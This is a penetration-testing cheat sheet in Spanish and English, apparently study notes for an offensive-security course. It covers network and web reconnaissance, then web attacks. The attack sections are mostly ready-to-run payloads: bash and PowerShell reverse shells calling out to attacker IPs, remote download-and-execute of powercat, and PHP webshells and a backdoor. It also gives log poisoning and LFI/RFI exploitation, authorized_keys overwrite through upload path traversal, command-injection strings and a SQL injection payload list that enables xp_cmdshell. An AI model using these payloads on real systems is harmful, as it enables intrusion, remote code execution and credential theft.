https://lolbas-project.github.io/

# Recon and vulnerabilities discovery

## Passive
### Google Hacking
https://www.exploit-db.com/google-hacking-database
```
site:<domain> -filetype:html
intitle:"index of" "parent directory"
```

### Repositories code
https://github.com/
```
owner:megacorpone path:users
```
https://gist.github.com/starred
https://about.gitlab.com/
https://sourceforge.net/

Herramientas para identificar información expuesta en repositorios
https://github.com/michenriksen/gitrob
https://github.com/gitleaks/gitleaks

## Active

### ICMP
```bash
for ip in $(cat ips.txt); do ping $ip -c 1 | grep icmp_seq ; done 
```
```bash
nmap -sn -iL ips.txt -oG ping-sweep.txt
cat ping-sweep.txt| grep Up | cut -d " " -f2
```

### Netcat
1. Escaneo de puertos TCP, netcat realiza el <b>three-way TCP handshak</b>. (-w: tomeout, -z, no envío de datos)
```bash
LINUX
nc -nvv -w 1 -z <IP> 3380-3390 2>&1 | grep open
WINDOWS
nc.exe -nvv -w 1 -z <IP> 4140-4145 2>&1 | findstr open
```
2. Escaneo de puertos UDP
```bash
nc -nv -u -z -w 1 <IP> 100-183 2>&1 | grep -vE "\?"
```

### nmap
https://rustscan.github.io/RustScan/
1. Identificar puertos tcp
```bash
nmap -Pn -sS --open -n <IP> --top-ports 10 --min-rate 1000 --max-retries 2 --reason -oN <IP>-top-ports10
nmap -Pn -sS --open -n <IP> --top-ports 1000 --min-rate 1000 --max-retries 2 --reason -oN <IP>-top-ports1000
nmap -Pn -sS -n <IP> -p- --min-rate 1000 --max-retries 2 --reason -oN <IP>-tcp-all
nmap -Pn -sS -sV -n <IP> -p <port1,port2...> --min-rate 1000 --max-retries 2 --reason -oN <IP>-tcp-sV
nmap -Pn -sS -sV -sC -n <IP> -p <port1,port2...> --min-rate 1000 --max-retries 2 --reason -oN <IP>-tcp-sC
```
2. Identificar puerto udp
```bash
nmap -Pn -sU -sV -n <IP> --top-ports 15 --min-rate 1000 --max-retries 2 --reason -oN <IP>-udp-top-15
nmap -Pn -sU -sV -n <IP> -p <port1,port2...>  --min-rate 1000 --max-retries 2 --reason -oN <IP>-udp-sC
```
3. Filtrar puertos en un formato 80,443,22...
```bash
cat <FILE> | grep -i "^[0-9]" | cut -d '/' -f 1 | xargs | sed 's/\ /,/g'
```
4. Filtrar hosts con puertos abiertos
```bash
cat file-oG | grep open | cut -d " " -f2
```
5. Utilizar scripts para realizar reconocimiento dependiendo el servicio
```bash
ls -la /usr/share/nmap/scripts | grep http | grep title
nmap --script-help http-headers
```

## DNS
https://www.shodan.io/
https://crt.sh/
https://dnsdumpster.com/
https://search.censys.io/
https://certificatedetails.com/
https://searchdns.netcraft.com

- Wordlist
```
/usr/share/seclists/Discovery/DNS/namelist.txt
/usr/share/seclists/Discovery/DNS/subdomains-spanish.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
```

### whois
```bash
whois <ip>
whois <ip> -h <server>
```

### host
```bash
host <domain>
host -t mx <domain>
host -t txt <domain>
```
1. Ataque de diccionario para identificar dominios DNS
```
for domain in $(cat domains.txt); do host $domain.megacorpone.com; done | grep -vi NXDOMAIN
```
```
for /F "tokens=*" %A in (wordlist.txt) do nslookup -type=TXT %A.megacorptwo.com <IPServerDNS>
```
2. Identificar sub dominios de forma invesa, mediante la dirección IP
```
for ip in $(seq 1 254); do host 200.23.91.$ip; done | grep -vE "not found | record"
```

### dnsrecon
```bash
dnsrecon -d <domain> -t std
dnsrecon -d <domain> -D /usr/share/seclists/Discovery/DNS/subdomains-spanish.txt -t brt
```

### dnsenum
```bash
dnsenum <domain>
```

### nslookup
```bash
nslookup mail.<domain>
nslookup -type=TXT info.<domain> <IP-Server-DNS>
```

### subfinder
```bash
subfinder -d <domain>
subfinder -d <domain> -sources crtsh,dnsdumpster
```

### amass
```bash
amass enum -list
amass enum -d <domain> -o <output.txt>
```

### ffuf
```bash
ffuf -u "https://FUZZ.<domain>" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

### FTP
```bash
ftp <IP>
wget -m --user=anonymous --password=anonymous ftp://192.168.214.65
```
```bash
for file in $(curl -s -u "anonymous:anonymous" ftp://192.168.214.65/Logs/ | sed 's/\ \{2,3\}/#/g' | cut -d ' ' -f 2); do curl -s  -u "anonymous:anonymous" ftp://192.168.214.65/Logs/$file --output $file && echo $file;  done
```

### RCP
```bash
nbtscan -r <IP>
```

```bash
rpcclient -U "" <IP>
```
```
>srvinfo /* operating system version */
>netshareenumall /* enumerate all shares and its paths */
>enumdomusers /* rid */*
>enumdomgroups
>querygroupmem 0x200  /* (rid) *rid group */*
>queryuser --> 0x1f4 *rid user
>getdompwinfo # smb password policy configured on the server
```

### SMB

```bash
nmap -v -p 139,445 --script smb-os-discovery <IP>
```

```bash
smbclient -L <IP> -N m SMB2
smbclient -L <IP>.168.158.65 -N
smbclient //<IP>/IPC$ -N -m SMB2
smbclient //<IP>/IPC$ -N
```

```bash
crackmapexec smb <IP> -u '' -p ''
crackmapexec smb <IP> -u '' -p '' --shares
crackmapexec smb <IP> -u 'guest' -p '' --shares
crackmapexec smb <IP> -u 'guest' -p '' --rid-brute 4000 
crackmapexec smb <IP> -u 'guest' -p '' --users
```

```bash
smbmap -H <IP> -u '' -p ''
smbmap -u guest -p '' -H <IP>
smbmap -H <IP> -r carpeta
smbmap -H <IP> --download general/file.txt
```

```bash
enum4linux -a <IP> -u '' -p ''
for ip in $(cat 192.168.250.1-smb | grep open | cut -d " " -f2); do enum4linux -a $ip -u '' -p ''; done 
```

```bash
net view \\dc01 /all
```

### SMTP
```bash
nc -nv <ip> 25
VRFY root
VRFY idontexist
# code 252: exist
```

### SNMP
```bash
nmap -sU --open -p 161 <segmento>.1-254 -oG open-snmp.txt
```
```bash
1.3.6.1.2.1.25.1.6.0	System Processes
1.3.6.1.2.1.25.4.2.1.2	Running Programs
1.3.6.1.2.1.25.4.2.1.4	Processes Path
1.3.6.1.2.1.25.2.3.1.4	Storage Units
1.3.6.1.2.1.25.6.3.1.2	Software Name
1.3.6.1.4.1.77.1.2.25	User Accounts
1.3.6.1.2.1.6.13.1.3	TCP Local Ports
```
```bash
echo "public\nprivate\nmanager" > community
cat open-snmp.txt | grep /open | grep -v filtered | cut -d " " -f2 > ips.txt
onesixtyone -c community -i ips.txt
```
```bash
snmpwalk -c public -v1 -t 10 192.168.50.151
snmpwalk -c public -v1 -t 10 192.168.250.151 1.3.6.1.2.1.25.4.2.1.2
snmpwalk -c public -v1 -t 10 192.168.250.151 -Oa 1.3.6.1.2.1.2.2.1.2
```

## HTTP
https://www.ssllabs.com/ssltest/

- URL encode
```bash
hURL -u
```

### Nmap scripts
```bash
nmap -Pn -sT -sV --script http-enum -n <IP> -p <PORT> 
nmap -Pn -sT -sV -n <IP> -p 80 --script http-enum --script-args http-enum.basepath="dev/"
```

### Web Tecnology
https://www.wappalyzer.com/
```bash
whatweb 192.168.158.65
```
```bash
whatis
```

### Fuzzing

- WORDLIST
```
#Directory and files
/usr/share/dirb/wordlists/common.txt
/usr/share/dirb/wordlists/small.txt
/usr/share/dirb/wordlists/big.txt
/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
/usr/share/dirb/wordlists/extensions_common.txt
/usr/share/dirb/wordlists/spanish.txt

#API REST
/FUZZ/v1
/FUZZ/v2
/users/v1
/users/v1/admin/
/users/v1/admin/password
/users/v1/login
/users/v1/register

#Vulns
/usr/share/dirb/wordlists/vulns/...
/usr/share/dirb/wordlists/vulns/apache.txt
/usr/share/dirb/wordlists/vulns/iis.txt
/usr/share/dirb/wordlists/vulns/jboss.txt
/usr/share/dirb/wordlists/vulns/netware.txt
/usr/share/dirb/wordlists/vulns/oracle.txt
/usr/share/dirb/wordlists/vulns/sap.txt
/usr/share/dirb/wordlists/vulns/sharepoint.txt
/usr/share/dirb/wordlists/vulns/tomcat.txt
/usr/share/dirb/wordlists/vulns/weblogic.txt
/usr/share/dirb/wordlists/vulns/websphere.txt
```

#### ffuf
```bash
#Virtual Host
ffuf -t 60 -u "http://<domain>" -H 'Host: FUZZ.<domain>' -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
```

#### dirsearch
```bash
dirsearch -u <url> -x 404,403,400 --exclude-sizes=0B --random-agent -t 60 
dirsearch -u <url> -e html,txt,asp,aspx -x 404,403,400 --exclude-sizes=0B --random-agent -t 60 -f
dirsearch -u <url> -e html,txt,asp,aspx -x 404,403,400 --exclude-sizes=0B --random-agent -t 60 -w <smaill.tzt || common.txt> -f
```

#### gobuster
```bash
gobuster dir -u 192.168.50.20 -w <common.txt || big.txt> -t 5 --exclude-length 0,42 -b 401,404 --random-agent
```

- API
```
/api_name/v1
{GOBUSTER}/v1
{GOBUSTER}/v2
```

```bash
gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern

# HTTP/1.0 405 METHOD NOT ALLOWED  (present resource)
gobuster dir -u http://192.168.50.16:5002/users/v1/admin/ -w /usr/share/wordlists/dirb/small.txt
```

```
# interact with the api
curl -i http://192.168.50.16:5002/users/v1
curl -d '{"password":"fake","username":"admin"}' -H 'Content-Type: application/json'  http://192.168.50.16:5002/users/v1/login

curl -d '{"password":"lab","username":"offsec","email":"pwn@offsec.com","admin":"True"}' -H 'Content-Type: application/json' http://192.168.50.16:5002/users/v1/register

curl http://192.168.50.16:5002/users/v1/admin/password' -H 'Content-Type: application/json' -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzEyMDEsImlhdCI6MTY0OTI3MDkwMSwic3ViIjoib2Zmc2VjIn0.MYbSaiBkYpUGOTH-tw6ltzW0jNABCDACR3_FdYLRkew' -d '{"password": "pwned"}'

curl -X 'PUT' 'http://192.168.50.16:5002/users/v1/admin/password' -H 'Content-Type: application/json' -H 'Authorization: OAuth eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE2NDkyNzE3OTQsImlhdCI6MTY0OTI3MTQ5NCwic3ViIjoib2Zmc2VjIn0.OeZH1rEcrZ5F0QqLb8IHbJI7f9KaRAkrywoaRUAsgA4' -d '{"password": "pwned"}'
```

```bash
echo "{GOBUSTER}/v1\n{GOBUSTER}/v2" > pattern; gobuster dir -u http://192.168.50.16:5002 -w /usr/share/wordlists/dirb/big.txt -p pattern
```

#### wfuzz

```bash
#Fuzz dir
wfuzz -c -t 50 --hc=404,400 --hh=3 -w <big.txt> http://<IP>/FUZZ
```

```bash
Fuzz params
wfuzz -c -z file,passwords.txt -X POST -d "username=admin&password=FUZZ&debug=0" -t 5 --hc=404 --hh=0 <URL>/login.php
```

#### dirb
```bash
dirb <url> -a pen200
dirb <url> -X '.html,.txt' /usr/share/dirb/wordlists/common.txt -a pen200
```

### Headers
https://securityheaders.com/
```bash
# Original ip address client by proxies
X-Forwarded-For
# Revelate information
X-Powered-By, x-amz-cf-id, X-Aspnet-Version
```

## Web Attacks

### XXS
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/charCodeAt
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode
https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/eval

```
# Payloads
< > ' " { } ;
```

- Encode js
1. Compress js
https://jscompress.com/
2. Encode charCodeAt
```
function encode_to_javascript(string) {
            var input = string
            var output = '';
            for(pos = 0; pos < input.length; pos++) {
                output += input.charCodeAt(pos);
                if(pos != (input.length - 1)) {
                    output += ",";
                }
            }
            return output;
        }
        
let encoded = encode_to_javascript('insert_minified_javascript')
console.log(encoded)
```

### Command Injection

### LFI
https://github.com/danielmiessler/SecLists/tree/master/Fuzzing/LFI
https://chryzsh.gitbooks.io/pentestbook/content/local_file_inclusion.html

#### CVES
Apache HTTP Server 2.4.49 (CVE-2021-41773)

```
/etc/passwd
/var/log/apache2/access.log
/home/<USER>/.ssh/id_rsa
C:\xampp\apache\logs
```

- URL Encoding
```
%00  - nullbyte below php 5.3
```

```bash
// LINUX
curl http://192.168.50.16/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
// WINDOWS
curl --path-as-is -s -i 'http://192.168.250.193/meteor/index.php?page=../../../../xampp\apache\logs\access.log'
```

 - Discovery vuln
```bash
for i in $(cat lfi_payloads.txt); do echo $i; curl -s -i --path-as-is "http://mountaindesserts.com/meteor/index.php?page=$i" | grep "root:x:" ; done
```

Windows
```bash
curl -s --path-as-is 'http://<IP>:3000/public/plugins/timeseries/../../../Windows\System32\drivers\etc\hosts'
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\logs\LogFiles\W3SVC1\
C:\inetpub\wwwroot\web.config
```

#### LFI to shell

- Access by ssh key
- 
```bash
curl http://<IP>/index.php?page=../../../../../../../../../home/user/.ssh/id_rsa
chmod 400 dt_key
ssh -i dt_key -p 2222 user@<IP>
/chmod 600 id_rsa 
/chmod 644 id_rsa 
```

- Log poisoning
```
bash -i >& /dev/tcp/192.168.119.3/4444 0>&1
bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.119.3%2F4444%200%3E%261%22
```

1. Discovery Log
```
/var/log/apache2/access.log
C:\xampp\apache\logs\access.log
```

2. Poisoning
```
<?php echo system($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
```

```bash
curl --path-as-is -s -i 'http://mountaindesserts.com/meteor/index.php' -H "User-Agent: <?php echo system(\$_GET['cmd']); ?>"
// LINUX
curl --path-as-is -s -i 'http://mountaindesserts.com/meteor/index.php?page=../../../../var/log/apache2/access.log&cmd=whoami' | grep www-data
// wINDOWS
curl --path-as-is -s -i 'http://192.168.250.193/meteor/index.php?page=../../../../xampp\apache\logs\access.log&cmd=whoami' | grep authority
```

3. Rev Shell to LINUX
```bash
curl --path-as-is -s -i 'http://mountaindesserts.com/meteor/index.php?page=../../../../var/log/apache2/access.log&cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.250%2F4444%200%3E%261%22'

curl --path-as-is -s -i 'http://mountaindesserts.com/meteor/index.php?page=../../../../var/log/apache2/access.log&cmd=echo+"YmFzaCAtYyAnYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjI1MC80NDQ0IDA%2bJjEnCg=="+|+base64+%2dd+|+bash+'
```

Generate payload base64 
```bash
bash#for ip in $(echo "192.168.45.250");do echo "bash -c 'bash -i >& /dev/tcp/$ip/4444 0>&1'" | base64 | sed 's/\+/%2b/g'; done 
YmFzaCAtYyAnYmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjQ1LjI1MC80NDQ0IDA%2bJjEnCg==
```

4. Rev Shell to WINDOWS
```bash
curl --path-as-is -s -i 'http://192.168.175.193/meteor/index.php?page=../../../../xampp\apache\logs\access.log&cmd=powershell%20%2dencode%20<<<BASE64>>>' | grep authority

curl --path-as-is -s -i "http://192.168.175.193/meteor/index.php?page=../../../../xampp\apache\logs\access.log&cmd=powershell+%2dc+IEX+(New-Object+System.Net.Webclient).DownloadString('http%3A%2F%2F192.168.45.250:8081%2Fpowercat.ps1')%3Bpowercat%20-c%20192.168.45.250%20-p%204444%20-e%20powershell" | grep authority

```

Generate payload base64
```bash
bash# pwsh
```
```bash
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.250",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

$Text = 'IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.45.222:8080/powercat.ps1");powercat -c 192.168.45.156 -p 4444 -e powershell'

$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
```

#### PHP Wrappers
1.  Read file php
```bash
curl http://mountaindesserts.com/meteor/index.php?page=admin.php
// Error when reading PHP code, since the text is interpreted
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php
// extract text in base64 (php://filter --> ROT13 or Base64)
curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php
echo "PCFET0NUW..." | base64 -d
```

2. Execute commands
```
data:// wrapper will not work in a default PHP installation
To exploit it, the allow_url_include7 setting needs to be enabled
https://www.php.net/manual/en/filesystem.configuration.php
```

```bash
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"
```

```bash
// Encode base64
echo -n '<?php echo system($_GET["cmd"]);?>' | base64
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```


### RFI
```
Target system must be configured *allow_url_include*
RFI vulnerabilities allow us to include files from a remote system over HTTP1 or SMB
PHP webshells in the /usr/share/webshells/php/
```

1. Discovery Vuln
```bash
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.250:4444/test"
nc -lvnp 4444
connect to [192.168.45.250] from (UNKNOWN) [192.168.175.16] 48194
GET /test HTTP/1.0
Host: 192.168.45.250:4444
Connection: close
```

2. Exploit

```
simple-backdoor.php
<?php
if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}
?>
```

```bash
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.180/simple-backdoor.php&cmd=ls"
curl "http://mountaindesserts.com/meteor/index.php?page=http://192.168.45.180/php-reverse-shell.php"                           
```


### File Upload Vulnerabilities
```
1. Upload files that are executable by the web application (PHP,JS,ASP)
2. Overwrite files like authorized_keys
```

1. Upload files
```
Bypass .phps , .php7, .pHP, phtml
Oher bypass is upload .txt and chance txt to php
```
https://github.com/fuzzdb-project/fuzzdb/blob/master/attack/file-upload/alt-extensions-php.txt

```bash
curl http://192.168.50.189/meteor/uploads/simple-backdoor.pHP?cmd=dir
```

2. Overwrite files
```bash
// Generate pair keys
# ssh-keygen
enerating public/private rsa key pair.
Enter file in which to save the key (/home/kali/.ssh/id_rsa): keyfileup
```

```
// Add ssh key pub
Considerate:
/etc/passwd o /root/.ssh/authorized_keys

Burp Suite

POST /upload HTTP/1.1
Host: mountaindesserts.com:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=---------------------------2450351141119075134075123007
Content-Length: 826
Origin: http://192.168.200.16:8000
Connection: close
Referer: http://192.168.200.16:8000/
Upgrade-Insecure-Requests: 1

-----------------------------2450351141119075134075123007
Content-Disposition: form-data; name="myFile"; filename="../../../../../../../root/.ssh/authorized_keys"
Content-Type: application/x-php

ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCZwSutMgAI50i2iu7aAiQxw+fxDXDbHYbNgLNfJgw6JQXwOYGjCIG+9pVafaWoWfL1vhCvHIrp7miJFxqFIKsB/uMYSfKPegtiO/zuBvlkB/FOuSRCqmSQUHU5dBoBlHm15Dq2wjLBpiuW2eO2Y81N+GIhqh88AfUtxCmYCb9WQn7CKYKpDjd78/akG7v9S/HR1zCJL8gL+2FF5Jykr2MG363g4XskjUL5tzZME/ciUYY9aBmKvFZNhiT09j7FX/uu1ml++BqDlerUiypxnxVe4kKvQmKt3R1XGMmggL/0U5kohDE8aM3Ur2pL/pXlSlj1IoiYGrt8jFc7IwVTPfaPCOOh/M7raDhO4YTEMrsUodx7DNImI2fcJ4GFBWPcUulGRwiBQNByq5F3PhV9GAlyMyF3x1FtAFu4AzhojWqycP+MKACJDWngvmpdr8VC3P3GucIny94z9GbEjRKkbdQ2JkIh7tilaKkDEGkEMw93gQZzy40Rn7GcrriHO7E1qM8= root@kali

-----------------------------2450351141119075134075123007--
```

```bash
rm ~/.ssh/known_hosts
chmod 400 file_key_priv
chmod 600 file_key_priv
ssh -p 2222 -i file_key_priv root@<IP>
```

### OS Command Injection

```bash
curl -X POST --data 'cmd=git version' http://192.168.50.189:8000/command
curl -X POST --data 'cmd=git%3Bipconfig' http://192.168.50.189:8000/command     // ;
// ;(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
curl -X POST --data 'cmd=git%3B(dir%202%3E%261%20*%60%7Cecho%20CMD)%3B%26%3C%23%20rem%20%23%3Eecho%20PowerShell' http://192.168.200.189:8000/command
```

```
//Payloads concatenar cadenas
$(echo+OFFSEC)
"+"OFFSEC
"+%26%26+echo+"OFFSEC
$(whereis+wget)
$(whereis+rpcclient)
";echo+"OFFSEC
";echo+$(echo+OFFSEC);echo+"
```

```bash
curl -s -i -X POST "http://192.168.175.16/login" -d 'username=texto&password=-text&ffa=text$(echo+OFFSEC)' | grep OFFSEC
curl -s -i -X POST "http://192.168.175.16/login" -d 'username=texto&password=-text&ffa=test"+"OFFSEC' | grep OFFSEC
curl -s -i -X POST "http://192.168.175.16/login" -d 'username=texto&password=-text&ffa=test"+%26%26+echo+"OFFSEC' | grep OFFSEC 
curl -s -i -X POST "http://192.168.175.16/login" -d 'username=texto&password=-text&ffa=test";echo+"OFFSEC' | grep OFFSEC
curl -s -i -X POST "http://192.168.175.16/login" -d 'username=texto&password=-text&ffa=test";echo+$(echo+OFFSEC);echo+"' | grep OFFSEC
curl -s -i -X POST "http://192.168.175.16/login" -d 'username=texto&password=-text&ffa=test$(whereis+wget)'
curl -s -i -X POST "http://192.168.175.16/login" -d 'username=texto&password=-text&ffa=test$(whereis+rpcclient)'
```

- Rev Shell
```
IEX (New-Object System.Net.Webclient).DownloadString("http://192.168.119.3/powercat.ps1");powercat -c 192.168.119.3 -p 4444 -e powershell 
```

```bash
curl -X POST -d 'cmd=git%3BIEX%20(New-Object%20System.Net.Webclient).DownloadString(%22http%3A%2F%2F192.168.45.180%2Fpowercat.ps1%22)%3Bpowercat%20-c%20192.168.45.180%20-p%204444%20-e%20powershell' http://192.168.200.189:8000/command

python3 -m http.server 80
nc -lnvp 4444
```


### SQLi

```sql
select version();
select system_user();
show databases;
SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec';
// To improve its security, the user's password is stored in the authentication_string field as a Caching-SHA-256 algorithm
https://dev.mysql.com/doc/refman/8.0/en/caching-sha2-pluggable-authentication.html
```

```sql
impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
SELECT @@version;
SELECT name FROM sys.databases;
SELECT * FROM offsec.information_schema.tables;
select * from offsec.dbo.users;
```

.\sqli_payloads.txt
```
'
'--
'--+
'--+//
'%23
'%23+
'%23+//
"
"--
"--+
"--+//
'+oR+1=1+in+(sEleCt+'OFFSEC321')+--+
'+oR+'OFFSEC'='OFFSEC
'+oR+'OFFSEC'='OFFSEC'+--+
'+AnD+'OFFSEC'='OFFSEC
'+AnD+'OFFSEC'='OFFSEC'+--+
'+AND+IF+(1=1,sleep(3),'false
'+AND+IF+(1=1,sleep(1),'false
'+AND+IF+(1=1,sleep(1),'false
'+AND+IF+(1=1,sleep(3),'false
'+AND+IF+(1=1,sleep(3),'false')+--+
'+AND+IF+(1=1,sleep(1),'false')+--+
'+AND+IF+(1=1,sleep(1),'false')+--+
'+AND+IF+(1=1,sleep(3),'false')+--+
';+IF+(1=1)+WAITFOR+DELAY+'0:0:03'--
'+OR+1=1;+IF+(1=1)+WAITFOR+DELAY+'0:0:03'--
'+WAITFOR+DELAY+'0:0:03'--
';+WAITFOR+DELAY+'0:0:03'--
'+WAITFOR+DELAY+'0:0:03
');+WAITFOR+DELAY+'0:0:03'--
'));+WAITFOR+DELAY+'0:0:03'--
')));+WAITFOR+DELAY+'0:0:03'--
"+WAITFOR+DELAY+'0:0:03'--
";+WAITFOR+DELAY+'0:0:03'--
"+WAITFOR+DELAY+'0:0:03
';EXECUTE+sp_configure+'show+advanced+options',1;RECONFIGURE;EXECUTE+sp_configure+'xp_cmdshell',1;RECONFIGURE;EXECUTE+xp_cmdshell+'ping+192.168.45.156';--
';SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(3)+ELSE+pg_sleep(0)+END--
';SELECT+CASE+WHEN+(1=1)+THEN+pg_sleep(3)+END--
';SELECT+pg_sleep(3)+--
';SELECT+pg_sleep(3)||'bar'+--
');SELECT+pg_sleep(3)+--
'));SELECT+pg_sleep(3)+--
'+AND+1=(select+1+from+pg_sleep(3))--
```

#### Error-based

When the app show error
```
' or 1=1 in (select @@version) -- //
' OR 1=1 in (SELECT * FROM users) -- //
' or 1=1 in (SELECT password FROM users) -- //
' or 1=1 in (SELECT password FROM users WHERE username = 'admin') -- //
```

* Scripts
```bash
// Obtener nombre de tablas
curl -s -i -X POST -d "uid='+or+1=1+in+(select+table_name+FROM+information_schema.tables)+--+&password=pwd" http://192.168.211.16/index.php -x "127.0.0.1:8080" | grep "Warning" 

// Obtener columnas
curl -s -i -X POST -d "uid='+or+1=1+in+(select+column_name+FROM+information_schema.columns WHERE table_name='users')+--+&password=pwd" http://192.168.211.16/index.php -x "127.0.0.1:8080" | grep "Warning" 

// Obtener usuarios
curl -s -i -X POST -d "uid='+or+1=1+in+(select++username+FROM+users)+--+&password=pwd" http://192.168.211.16/index.php -x "127.0.0.1:8080" | grep "Warning" 

// Obtener password de un usuario
curl -s -i -X POST -d "uid='+or+1=1+in+(select+password+FROM+users+where+username='admin')+--+&password=pwd" http://192.168.211.16/index.php -x "127.0.0.1:8080" | grep "Warning"
```

#### UNION-based

```
// LIKE
%

// Determinar N columnas, iterar hasta el error
' ORDER BY 1-- //
' ORDER BY 1--

// Determinar # de columnas y tipo de dato
' UNION SELECT NULL--
' UNION SELECT 'a',NULL--
' UNION SELECT NULL FROM DUAL-- (ORACLE)

// % Todos los registros + actual db, usuario y version
%' UNION SELECT database(), user(), @@version, null, null -- //

// Base de datos, usuario y version de DB
' UNION SELECT null, null, database(), user(), @@version  -- //

// Nombre de tabla, columna y actual db
' union select null, table_name, column_name, table_schema, null from information_schema.columns where table_schema=database() -- //

// Usuario, password (MYSQL -> PASSWD MD5)
' UNION SELECT null, username, password, description, null FROM users -- // 
```

* Concatenar cadenas
```
'foo'||'bar' #ORACLE
'foo'+'bar'  #MICROSOFT
'foo'||'bar' #POSGRES
'foo' 'bar'  #MYSQL
CONCAT('foo','bar') #MYSQL
```
* Substring
```
SUBSTR('foobar', 4, 2)      Oracle
SUBSTRING('foobar', 4, 2)   Microsoft
SUBSTRING('foobar', 4, 2)   PostgreSQL
SUBSTRING('foobar', 4, 2)   MySQL
```

* Listar Schema
```
SELECT * FROM information_schema.tables
SELECT * FROM information_schema.columns WHERE table_name = 'Users'

' UNION SELECT table_name, NULL FROM information_schema.tables--    (Lista tablas)
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_kzdtmr'--  (Listar columnas)
' UNION SELECT username_ophemz, password_cuiuxw FROM users_kzdtmr--  (Consultyar información)
```

* Scripts
```bash
// Identicar sentencia para minar datos
curl -s -i -X POST -d "item='+UNION+SELECT+NULL,(SELECT 'OFFSEC'),NULL,NULL,NULL+--+" http://192.168.211.16/search.php -x "127.0.0.1:8080" | grep "OFFSEC"

// minar datos mediante una sub consulta
curl -s -i -X POST -d "item='+UNION+SELECT+NULL,(select+CONCAT(username,'--',password)+FROM+users+LIMIT+1),NULL,NULL,NULL+--+" http://192.168.211.16/search.php -x "127.0.0.1:8080"

// minar datos mediante las columnas disponibles
curl -s -i -X POST -d "item='+UNION+SELECT+NULL,CONCAT(username,'--',password),NULL,NULL,NULL+FROM+users+--+" http://192.168.211.16/search.php -x "127.0.0.1:8080"
```

#### Boolean-based

```
http://192.168.50.16/blindsqli.php?user=offsec'+AND+1=1+--+//
offsec' AND '1'='1
offsec' AND '1'='2
```

* Minar información
```
// GET PWD HASH (variar Administrator'), 2, 1) y el caracter)
offsec' AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm    

//PROCESS
offsec' AND '1'='1

// Confirmed that table is users
offsec' AND (SELECT 'a' FROM users LIMIT 1)='a 

// Confirmed that user is administrator
offsec' AND (SELECT 'a' FROM users WHERE username='administrator')='a

// Get lengh the pwd, variar 1
offsec' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a    

// Variar password,2,1)  y sername='administrator')='b
offsec' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
```

```bash
// Identificar vulnerabilidad, revisando la longitud de respuesta 
echo "[+] Longitud inicial:" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin" -x "127.0.0.1:8080" |wc ; while IFS= read -r p; do echo "[+] Payload: $p" && curl -s -i -X GET "http://192.168.211.16/blindsqli.php?user=admin$p" -x "127.0.0.1:8080" | wc ;done < sqli_payloads.txt
```

```bash
// Identificar tablas con diccionario
